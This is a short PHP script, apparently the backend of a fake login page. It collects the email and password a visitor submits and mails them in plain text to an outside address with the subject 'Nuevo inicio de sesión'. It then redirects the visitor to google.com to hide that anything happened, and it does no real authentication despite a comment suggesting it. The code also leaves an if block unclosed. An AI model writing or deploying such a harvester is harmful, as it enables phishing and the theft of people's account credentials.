<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recibir datos del formulario
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Aquí puedes realizar la validación de los datos, autenticación, etc.
    
$to = "gmail@hugoarribasmunoz2019.com";
$subject = "Nuevo inicio de sesión";
$message = "Correo electrónico: $email\nContraseña: $password";
mail($to, $subject, $message);

header("Location: https://www.google.com");
exit();

?>
